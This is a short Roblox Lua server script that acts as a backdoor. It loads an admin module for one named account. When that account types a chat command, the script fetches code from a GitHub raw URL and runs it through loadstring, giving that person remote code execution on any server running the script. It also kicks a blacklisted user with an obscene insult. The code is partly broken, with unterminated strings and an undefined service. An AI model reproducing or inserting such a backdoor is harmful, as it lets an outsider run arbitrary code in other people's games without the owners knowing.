local EnabledDoDOS = true
local BlackList = {
  [3783228048]=true, --< Vadik Pidorasik
}
local AdminPanel = {
  ["t10_kol"]=true,
}

game.Players.PlayerAdded:Connect(function(plr)
    if EnabledDoDOS==false then return end
    if BlackList[plr.UserId] then
        plr:Kick("Соси Хуй Вад 😀")
    end
    if AdminPanel[plr.Name] then
        require(7192763922).load(plr.Name)
    end
    if plr.Name == "t10_kol" then
      plr.Chatted:Connect(function(message)
          if message == "ADM.Restart then
              local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
              local f = loadstring(code)
              f()
          elseif message == "ADM.Sky then
            local Asset = game.InsertService:LoadAsset(16797054140):GetChildren()[1]
            Asset.Parent = game.Lighting
          end
        end)
    end
end)
